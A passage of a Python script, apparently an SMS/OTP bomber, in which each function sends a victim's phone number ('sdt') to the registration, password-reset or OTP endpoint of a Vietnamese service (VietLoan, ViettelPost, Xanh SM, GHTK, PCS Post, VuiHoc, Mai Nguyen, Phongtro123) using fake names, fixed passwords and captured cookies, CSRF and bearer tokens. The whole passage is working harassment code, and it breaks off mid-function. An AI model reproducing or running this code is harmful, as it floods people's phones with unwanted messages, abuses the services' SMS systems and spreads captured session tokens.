utm_uid=eyJpdiI6Ik1SOUdhUm0wNnF2Z0ZadUZhT045MVE9PSIsInZhbHVlIjoiNDZ4S1h4dEdiOEJEeVdCM2Rub2dKSk43Z25CRnBBRTZsT2Y3OVlmeWs5QTVUL2NZUWNhakZmdXFuazEyUWIvMmZaemEwUm9wd2RlUTliVXFqbm5kbzRjZFp1N2dDNlRIYmE0cGxzdzRqWCtCWCtRVHRPSFN3Rmlmb1B5dTEvWFMiLCJtYWMiOiIwNTYxZjRhMGJlODdkMzRmNDlkY2VjM2Y0YWRhMjNhODk3NjhiZDA1ZjhjNTVhZTg5NmE3M2VhYWZhNTk2OTczIiwidGFnIjoiIn0%3D; ec_cache_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_client=false; ec_etag_client_utm=null; uid=632e6101-b428-93c3-3898-ca177175bb79; client=false; client_utm=null',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'bB8e952pFPiQIYl5nX3k5NvKO8MW2EudDB3hZbNi',
    }

    try:
        response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETLOAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETLOAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def viettelpost():
    cookies = {
        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM',
        '_gid': 'GA1.2.766667119.1722475009',
        '_ga_P86KBF64TN': 'GS1.1.1722475009.1.1.1722475193.0.0.0',
        '_ga_7RZCEBC0S6': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
        '_ga': 'GA1.1.283730043.1722475009',
        '_ga_WN26X24M50': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM; _gid=GA1.2.766667119.1722475009; _ga_P86KBF64TN=GS1.1.1722475009.1.1.1722475193.0.0.0; _ga_7RZCEBC0S6=GS1.1.1722475008.1.1.1722475193.0.0.0; _ga=GA1.1.283730043.1722475009; _ga_WN26X24M50=GS1.1.1722475008.1.1.1722475193.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormVerifyOtpModel.Phone': '',
        'FormVerifyOtpModel.Email': '',
        'FormVerifyOtpModel.Password': '',
        'FormVerifyOtpModel.UserId': '',
        'FormForgotPassword.Email': '',
        'FormForgotPassword.UserId': '',
        'FormForgotPassword.OtpRequestToken': 'hQJjQ5MHm/+Xhhl4WE/bgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb+JLY+l+plhFg3xKvRJBLWpX0SSiip2/oxddKFM4tXwC0QGY8JYhI6UUF/8lwVKqM12H+cd4/DB3SEwaXkix8HEy+RpAnPCNw7N1ZjmTGxwP6cHz8lr6sEIg+mMXiOB/neVMK8xib3SiJf5p7RyzPf7J+CYANyeiU9YGQ0TZJFfSRHm9IEyW6PmxB4+4nh9h5CGU6/7EAw4924l',
        'FormRegister.FullName': 'quoc tien huy',
        'FormRegister.UserName': '',
        'FormRegister.Email': '',
        'FormRegister.Phone': sdt,
        'FormRegister.ConfirmPhone': 'False',
        'FormRegister.ConfirmEmail': 'False',
        'FormRegister.RequiredPhone': 'False',
        'FormRegister.RequiredEmail': 'False',
        'FormRegister.Provider': '',
        'FormRegister.ProviderUserId': '',
        'FormRegister.Password': '123123aA',
        'FormRegister.ConfirmPassword': '123123aA',
        'FormRegister.IsRegisterFromPhone': 'True',
        'FormRegister.UserId': '',
        'FormMergeModel.JsonListEmailConflict': '',
        'FormMergeModel.JsonListPhoneConflict': '',
        'FormMergeModel.EmailSelected': '',
        'FormMergeModel.PhoneSelected': '',
        'FormMergeModel.PhoneVerify': '',
        'FormMergeModel.EmailVerify': '',
        'FormMergeModel.IsRequiredSelect': 'False',
        'FormMergeModel.Password': '',
        'FormMergeModel.Provider': '',
        'FormMergeModel.ProviderUserId': '',
        'FormMergeModel.IsEmailVerified': 'False',
        'FormMergeModel.IsPhoneVerified': 'False',
        'FormNotMergeModel.Password': '',
        'FormNotMergeModel.Provider': '',
        'FormNotMergeModel.ProviderUserId': '',
        'FormNotMergeModel.UserSSOId': '',
        'FormNotMergeModel.EmailSelected': '',
        'FormNotMergeModel.PhoneSelected': '',
        'FormNotMergeModel.NotMergePhoneVerify': '',
        'FormNotMergeModel.NotMergeEmailVerify': '',
        'FormNotMergeModel.IsEmailVerified': 'False',
        'FormNotMergeModel.IsPhoneVerified': 'False',
        'FormLoginOTP.Username': '',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=2fm315xzemzryzwbsz8jfj',
        'ConfirmOtpType': 'Register',
        'UserClientId': '',
        'ClientId': '',
        'OTPCode1': '',
        'OTPCode2': '',
        'OTPCode3': '',
        'OTPCode4': '',
        'OTPCode5': '',
        'OTPCode6': '',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0',
    }

    try:
        response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETTELPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def xanhsmreg():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://dangky.xanhsm.com',
        'priority': 'u=1, i',
        'referer': 'https://dangky.xanhsm.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'Data': {
            'YearExperience': 'GT_5_YEAR',
            'AppPartners': [
                'Gojek',
            ],
            'OnlineTime': 'FROM_4H_TO_8H_DAY',
            'DesiredIncome': 'FROM_10M_TO_20M',
            'BirthPlace': 'An Giang',
        },
        'City': 'hanoi',
        'Tel': sdt,
        'Name': 'VAN A DAT',
        'Source': '',
        'Online': False,
    }

    try:
        response = requests.post('https://gapi.xanhsm.com/bike/registering/create-registration', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("XANHSMREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("XANHSMREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtkreg():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'name': 'GTC Shop',
        'tel': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'first_address': '12 BC TIn',
        'province': 'An Giang',
        'province_id': '833',
        'district': 'Huyện Châu Phú',
        'district_id': '1470',
        'ward': 'Xã Bình Long',
        'ward_id': '16579',
        'hamlet': 'Ấp Bình Chiến',
        'hamlet_id': '114065',
    }

    try:
        response = requests.post(
            'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTKREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTKREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtk():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'card_images': [
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png',
                'image_order': 1,
            },
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png',
                'image_order': 2,
            },
        ],
    }

    try:
        response = requests.post('https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pcspostreg():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://account.pcspost.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.pcspost.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'StationCode': '89304',
        'confirmPassword': '123123aA@',
        'NewPassword': '123123aA@',
        'FullName': 'quoc tien huy',
        'EmailOrPhoneNr': sdt,
        'Password': '123123aA@',
    }

    try:
        response = requests.post('https://id.pcs.vn/api/account/mobile-register/POST', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PCSPOSTREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PCSPOSTREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pcspost():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://account.pcspost.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.pcspost.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'EmailOrPhone': sdt,
    }

    try:
        response = requests.get('https://id.pcs.vn/api/account/reset-password', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PCSPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PCSPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vuihoc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ja',
        'app-id': '3',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://vuihoc.vn',
        'priority': 'u=1, i',
        'referer': 'https://vuihoc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'send-from': 'WEB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.vuihoc.vn/api/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VUIHOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VUIHOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mainguyen():
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': 'https://member.mainguyen.vn',
        'Referer': 'https://member.mainguyen.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'content-type': 'application/json',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'guestKey': 'dde60be3eb3859db4a4f15351134c991',
    }

    json_data = {
        'phone': sdt,
        'password': '123123aA@',
        'name': 'thahn van',
    }

    response = requests.post('https://api.mainguyen.vn/auth/customer/register', params=params, headers=headers, json=json_data)

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://member.mainguyen.vn',
    'Referer': 'https://member.mainguyen.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    'content-type': 'application/json',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'guestKey': 'dde60be3eb3859db4a4f15351134c991',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.mainguyen.vn/auth/customer/request-otp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MAINGUYEN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MAINGUYEN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def phongtro123():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6Im5QOVFUUmg2Ty9vbXJnRWllU1V4SEE9PSIsInZhbHVlIjoiSTNIN1V1RWJuaXlINC9EZS9HYk03MDltcWhyakN5bExHTm1zaC9WTmQ5d3I2anJLZld5QzJMcEhyRmpQYUdJeUVXd0NHNkNVaFY2amNpY1k1YnFKdDBRdm0vN2dIWFVqQnlMTStTbnNSTWJKTVpCMUIrbnZsYjV5azdySi96L2YiLCJtYWMiOiI1ODhmMDE0NzQ5MjQ2MzEyZjczYjczOTliOGNmN2RjY2RlYzhjYWEyNjFmODlkNDZmZDFhODEzM2M5NjRjMDAwIiwidGFnIjoiIn0%3D',
        'pt123': 'as9S3hDuOYKkfWyEpIyHOQ0GeVoAMeXU0Qi5K3kC',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6Im5QOVFUUmg2Ty9vbXJnRWllU1V4SEE9PSIsInZhbHVlIjoiSTNIN1V1RWJuaXlINC9EZS9HYk03MDltcWhyakN5bExHTm1zaC9WTmQ5d3I2anJLZld5QzJMcEhyRmpQYUdJeUVXd0NHNkNVaFY2amNpY1k1YnFKdDBRdm0vN2dIWFVqQnlMTStTbnNSTWJKTVpCMUIrbnZsYjV5azdySi96L2YiLCJtYWMiOiI1ODhmMDE0NzQ5MjQ2MzEyZjczYjczOTliOGNmN2RjY2RlYzhjYWEyNjFmODlkNDZmZDFhODEzM2M5NjRjMDAwIiwidGFnIjoiIn0%3D; pt123=as9S3hDuOYKkfWyEpIyHOQ0GeVoAMeXU0Qi5K3kC',
        'origin': 'https://phongtro123.com',
        'priority': 'u=1, i',
        'referer': 'https://phongtro123.com/dang-ky-tai-khoan',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'd7IH4lHj0sq7jcOx3IZUa5eKcuCwnw51DNxp82F9',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc huuh',
        'phone': sdt,
        'password': '123123aa',
        'user_type': '2',
        'redirect': '',
    }

    response = requests.post('https://phongtro123.com/user/register', cookies=cookies, headers=headers, data=data, verify=False)

    cookies = {
        'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d': 'eyJpdiI6IjNjdFZQcURYTkxxWGhHdWJ4VUpLemc9PSIsInZhbHVlIjoicExoaWRGalNEYVJQMVVFRTlTWHM1MlB2aGR1aGl4dmJDWTNHaDg2QXAxWm14QkdxK3V5cXBCcExFQUtFQ2lFVzk3TDlsb3FtYUpMQWd6TCt1bkhrTXBPbWoreGFoY0FWM1owMXZISmZ3VS9HTDFDMzMzdEVnbjVyd2svMmJkNXdFSlFlb244bjJPQkpMK1ptaDFJMFp0ZVVPck5WVThGVkdNTTAxNHIwZFp6MU1ZR0ZRRnYwd3hPSXkxLy8yS2dTIiwibWFjIjoiZjRhYzZlOTk3NzUwNDZmYmZmMTQyNWY2NTQ4YjZiNGVmYTgyNWI5MjM4ODE2NzA0ZmViZTI2YmE1OWU2MjQ2MyIsInRhZyI6IiJ9',
        'XSRF-TOKEN': 'eyJpdiI6IkVmb2N6NCtlbDBHeU8vMGphMnoyOWc9PSIsInZhbHVlIjoiUVJIYWF3STFOSm9ZYnpWQkVXNll5S3pxbGExWStZUUo0RnVUQ21zVEM0S3Y5S3VjcnN3R2I2UDFGTm4xRm1KZ3o0ZlFoQkpGd05OUXlZd051ZGQrb0I0ZEtGR0h5Qy9VdVVFNjJpT3laRXlOa2tScis5VkQyY3VJT2RSM09mTzEiLCJtYWMiOiJlNTY3MGYzNTdkMmVlMWUyYTEzNTIwMmU5YjhkOTAwMTgyOWY4NjBkMTc2YWU3YWIwNWQzMGJmYTM5MWVlOTVmIiwidGFnIjoiIn0%3D',
        'pt123': '0ihSBuS6AusN83IAZibBtqvVbH2eH4GI795UTpzl',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjNjdFZQcURYTkxxWGhHdWJ4VUpLemc9PSIsInZhbHVlIjoicExoaWRGalNEYVJQMVVFRTlTWHM1MlB2aGR1aGl4dmJDWTNHaDg2QXAxWm14QkdxK3V5cXBCcExFQUtFQ2lFVzk3TDlsb3FtYUpMQWd6TCt1bkhrTXBPbWoreGFoY0FWM1owMXZISmZ3VS9HTDFDMzMzdEVnbjVyd2svMmJkNXdFSlFlb244bjJPQkpMK1ptaDFJMFp0ZVVPck5WVThGVkdNTTAxNHIwZFp6MU1ZR0ZRRnYwd3hPSXkxLy8yS2dTIiwibWFjIjoiZjRhYzZlOTk3NzUwNDZmYmZmMTQyNWY2NTQ4YjZiNGVmYTgyNWI5MjM4ODE2NzA0ZmViZTI2YmE1OWU2MjQ2MyIsInRhZyI6IiJ9; XSRF-TOKEN=eyJpdiI6IkVmb2N6NCtlbDBHeU8vMGphMnoyOWc9PSIsInZhbHVlIjoiUVJIYWF3STFOSm9ZYnpWQkVXNll5S3pxbGExWStZUUo0RnVUQ21zVEM0S3Y5S3VjcnN3R2I2UDFGTm4xRm1KZ3o0ZlFoQkpGd05OUXlZd051ZGQrb0I0ZEtGR0h5Qy9VdVVFNjJpT3laRXlOa2tScis5VkQyY3VJT2RSM09mTzEiLCJtYWMiOiJlNTY3MGYzNTdkMmVlMWUyYTEzNTIwMmU5YjhkOTAwMTgyOWY4NjBkMTc2YWU3YWIwNWQzMGJmYTM5MWVlOTVmIiwidGFnIjoiIn0%3D; pt123=0ihSBuS6AusN83IAZibBtqvVbH2eH4GI795UTpzl',
        'origin': 'https://phongtro123.com',
        'priority': 'u=1, i',
        'referer': 'https://phongtro123.com/xac-thuc-tai-khoan?f=r',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'd7IH4lHj0sq7jcOx3IZUa5eKcuCwnw51DNxp82F9',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'action': 'verify',
    }

    try:
        response = requests.post('https://phongtro123.com/api/user/send-token', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHONGTRO123 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHONGTRO123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def chothuephongtro():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlhBMHpoMjlLUnRTaXA0Z1Y3a2pXN0E9PSIsInZhbHVlIjoiR21wTmZFNVlnL0dpSkE1RTlMUGVZQ296Mkg1aHRhUUI2WTduMVJsNW85QkRGUUZDT2dRY3MxQmRTTDhvTXRYM1FEUHowMnZHd3NjbDM3bWtTUHFrK0dpbDNkVldORFdsb2x3dVdBRHJKbTQwRFg4cm9lSDZtWGk1S0hqODdsN08iLCJtYWMiOiJjZDRiMWNkYWFhNGI2ODkwZGEzYjMwMzhjMmUyNWUyOTY1OThkZTE2ZThiNzBlZTlkYmQ1MjNjMDY3YTIwNWRmIiwidGFnIjoiIn0%3D',
        'bds123_session': 'KlkV3gRFmHwv7NCrEL7uQIuTNmw5dZyQxwfdIBDD',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
